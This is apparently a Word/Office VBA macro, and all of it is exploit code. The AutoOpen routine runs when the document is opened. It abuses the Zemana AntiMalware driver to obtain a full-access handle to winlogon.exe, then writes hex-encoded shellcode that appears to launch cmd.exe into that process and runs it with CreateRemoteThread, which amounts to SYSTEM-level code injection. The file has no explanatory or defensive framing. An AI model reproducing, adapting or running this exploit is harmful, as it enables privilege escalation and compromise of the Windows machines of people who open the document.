Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type

Private Declare PtrSafe Function CreateFileA Lib "kernel32" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As SECURITY_ATTRIBUTES, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As LongPtr
Private Declare PtrSafe Function GetCurrentProcessId Lib "kernel32" () As LongPtr
Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlags As Long, ByVal lProcessID As Long) As LongPtr
Private Declare PtrSafe Function DeviceIoControl Lib "kernel32" (ByVal hDevice As LongPtr, ByVal dwIoControlCode As Long, lpInBuffer As Any, ByVal nInBufferSize As Long, lpOutBuffer As Any, ByVal nOutBufferSize As Long, lpBytesReturned As Long, lpOverlapped As Any) As Long

Private Declare PtrSafe Function Process32First Lib "kernel32" (ByVal hSnapShot As LongPtr, uProcess As PROCESSENTRY32) As Boolean
Private Declare PtrSafe Function Process32Next Lib "kernel32" (ByVal hSnapShot As LongPtr, uProcess As PROCESSENTRY32) As Boolean

Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function VirtualFree Lib "kernel32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As String, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal ProcessHandle As LongPtr, ByRef lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As Long
Sub AutoOpen()
    Ring0
End Sub
Sub Ring0()
    ' Create handle for driver
    Dim hDevice As LongPtr
    Dim lpSecurityAttributes As SECURITY_ATTRIBUTES
    hDevice = CreateFileA("\\.\ZemanaAntiMalware", &H40000000 Or &H80000000, 0, lpSecurityAttributes, &H3, &H80, Empty)
    
    ' Register Process with Driver
    Dim pid As LongPtr, BytesReturned As Long
    pid = GetCurrentProcessId()
    IOCTL_Register = DeviceIoControl(hDevice, &H80002010, pid, 4, Empty, 0, BytesReturned, Empty)
    
    ' PID for winlogon.exe
    Dim WinlogonPid As Long
    Dim pEntry As PROCESSENTRY32
    Dim continueSearching As Boolean
    
    pEntry.dwSize = LenB(pEntry)
    
    Dim snapshot As LongPtr
    snapshot = CreateToolhelp32Snapshot(&H2&, ByVal 0&)
    continueSearching = Process32First(snapshot, pEntry)
    
    Do
        If InStr(1, pEntry.szExeFile, "winlogon.exe") Then
            WinlogonPid = pEntry.th32ProcessID
            continueSearching = False
        Else
            continueSearching = Process32Next(snapshot, pEntry)
        End If
    Loop While continueSearching
    
    ' Get full access winlogon.exe handle for exploit
    Dim WinlogonHandle As Long
    DeviceIoControl hDevice, &H8000204C, WinlogonPid, 4, WinlogonHandle, 4, BytesReturned, Empty
    
    ' Get memory address for writing to winlogon.exe
    RemoteAllocation = VirtualAllocEx(WinlogonHandle, Empty, &H1000, &H1000, &H40)
    
    ' Shellcode
    Dim sShellCode As String
    sShellCode = ""
    sShellCode = sShellCode + Chr(&HFC) + Chr(&H48) + Chr(&H83) + Chr(&HE4) + Chr(&HF0) + Chr(&HE8) + Chr(&HC0) + Chr(&H0) + Chr(&H0) + Chr(&H0) + Chr(&H41) + Chr(&H51) + Chr(&H41) + Chr(&H50)
    sShellCode = sShellCode + Chr(&H52) + Chr(&H51) + Chr(&H56) + Chr(&H48) + Chr(&H31) + Chr(&HD2) + Chr(&H65) + Chr(&H48) + Chr(&H8B) + Chr(&H52) + Chr(&H60) + Chr(&H48) + Chr(&H8B) + Chr(&H52)
    sShellCode = sShellCode + Chr(&H18) + Chr(&H48) + Chr(&H8B) + Chr(&H52) + Chr(&H20) + Chr(&H48) + Chr(&H8B) + Chr(&H72) + Chr(&H50) + Chr(&H48) + Chr(&HF) + Chr(&HB7) + Chr(&H4A) + Chr(&H4A)
    sShellCode = sShellCode + Chr(&H4D) + Chr(&H31) + Chr(&HC9) + Chr(&H48) + Chr(&H31) + Chr(&HC0) + Chr(&HAC) + Chr(&H3C) + Chr(&H61) + Chr(&H7C) + Chr(&H2) + Chr(&H2C) + Chr(&H20) + Chr(&H41)
    sShellCode = sShellCode + Chr(&HC1) + Chr(&HC9) + Chr(&HD) + Chr(&H41) + Chr(&H1) + Chr(&HC1) + Chr(&HE2) + Chr(&HED) + Chr(&H52) + Chr(&H41) + Chr(&H51) + Chr(&H48) + Chr(&H8B) + Chr(&H52)
    sShellCode = sShellCode + Chr(&H20) + Chr(&H8B) + Chr(&H42) + Chr(&H3C) + Chr(&H48) + Chr(&H1) + Chr(&HD0) + Chr(&H8B) + Chr(&H80) + Chr(&H88) + Chr(&H0) + Chr(&H0) + Chr(&H0) + Chr(&H48)
    sShellCode = sShellCode + Chr(&H85) + Chr(&HC0) + Chr(&H74) + Chr(&H67) + Chr(&H48) + Chr(&H1) + Chr(&HD0) + Chr(&H50) + Chr(&H8B) + Chr(&H48) + Chr(&H18) + Chr(&H44) + Chr(&H8B) + Chr(&H40)
    sShellCode = sShellCode + Chr(&H20) + Chr(&H49) + Chr(&H1) + Chr(&HD0) + Chr(&HE3) + Chr(&H56) + Chr(&H48) + Chr(&HFF) + Chr(&HC9) + Chr(&H41) + Chr(&H8B) + Chr(&H34) + Chr(&H88) + Chr(&H48)
    sShellCode = sShellCode + Chr(&H1) + Chr(&HD6) + Chr(&H4D) + Chr(&H31) + Chr(&HC9) + Chr(&H48) + Chr(&H31) + Chr(&HC0) + Chr(&HAC) + Chr(&H41) + Chr(&HC1) + Chr(&HC9) + Chr(&HD) + Chr(&H41)
    sShellCode = sShellCode + Chr(&H1) + Chr(&HC1) + Chr(&H38) + Chr(&HE0) + Chr(&H75) + Chr(&HF1) + Chr(&H4C) + Chr(&H3) + Chr(&H4C) + Chr(&H24) + Chr(&H8) + Chr(&H45) + Chr(&H39) + Chr(&HD1)
    sShellCode = sShellCode + Chr(&H75) + Chr(&HD8) + Chr(&H58) + Chr(&H44) + Chr(&H8B) + Chr(&H40) + Chr(&H24) + Chr(&H49) + Chr(&H1) + Chr(&HD0) + Chr(&H66) + Chr(&H41) + Chr(&H8B) + Chr(&HC)
    sShellCode = sShellCode + Chr(&H48) + Chr(&H44) + Chr(&H8B) + Chr(&H40) + Chr(&H1C) + Chr(&H49) + Chr(&H1) + Chr(&HD0) + Chr(&H41) + Chr(&H8B) + Chr(&H4) + Chr(&H88) + Chr(&H48) + Chr(&H1)
    sShellCode = sShellCode + Chr(&HD0) + Chr(&H41) + Chr(&H58) + Chr(&H41) + Chr(&H58) + Chr(&H5E) + Chr(&H59) + Chr(&H5A) + Chr(&H41) + Chr(&H58) + Chr(&H41) + Chr(&H59) + Chr(&H41) + Chr(&H5A)
    sShellCode = sShellCode + Chr(&H48) + Chr(&H83) + Chr(&HEC) + Chr(&H20) + Chr(&H41) + Chr(&H52) + Chr(&HFF) + Chr(&HE0) + Chr(&H58) + Chr(&H41) + Chr(&H59) + Chr(&H5A) + Chr(&H48) + Chr(&H8B)
    sShellCode = sShellCode + Chr(&H12) + Chr(&HE9) + Chr(&H57) + Chr(&HFF) + Chr(&HFF) + Chr(&HFF) + Chr(&H5D) + Chr(&H48) + Chr(&HBA) + Chr(&H1) + Chr(&H0) + Chr(&H0) + Chr(&H0) + Chr(&H0)
    sShellCode = sShellCode + Chr(&H0) + Chr(&H0) + Chr(&H0) + Chr(&H48) + Chr(&H8D) + Chr(&H8D) + Chr(&H1) + Chr(&H1) + Chr(&H0) + Chr(&H0) + Chr(&H41) + Chr(&HBA) + Chr(&H31) + Chr(&H8B)
    sShellCode = sShellCode + Chr(&H6F) + Chr(&H87) + Chr(&HFF) + Chr(&HD5) + Chr(&HBB) + Chr(&HE0) + Chr(&H1D) + Chr(&H2A) + Chr(&HA) + Chr(&H41) + Chr(&HBA) + Chr(&HA6) + Chr(&H95) + Chr(&HBD)
    sShellCode = sShellCode + Chr(&H9D) + Chr(&HFF) + Chr(&HD5) + Chr(&H48) + Chr(&H83) + Chr(&HC4) + Chr(&H28) + Chr(&H3C) + Chr(&H6) + Chr(&H7C) + Chr(&HA) + Chr(&H80) + Chr(&HFB) + Chr(&HE0)
    sShellCode = sShellCode + Chr(&H75) + Chr(&H5) + Chr(&HBB) + Chr(&H47) + Chr(&H13) + Chr(&H72) + Chr(&H6F) + Chr(&H6A) + Chr(&H0) + Chr(&H59) + Chr(&H41) + Chr(&H89) + Chr(&HDA) + Chr(&HFF)
    sShellCode = sShellCode + Chr(&HD5) + Chr(&H63) + Chr(&H6D) + Chr(&H64) + Chr(&H2E) + Chr(&H65) + Chr(&H78) + Chr(&H65) + Chr(&H0)
    
    ' Writing to winlogon.exe
    WPM = WriteProcessMemory(WinlogonHandle, RemoteAllocation, sShellCode, Len(sShellCode), VarPtr(BytesReturned))
    
    CRT = CreateRemoteThread(WinlogonHandle, lpSecurityAttributes, 0, RemoteAllocation, Empty, 0, Empty)
End Sub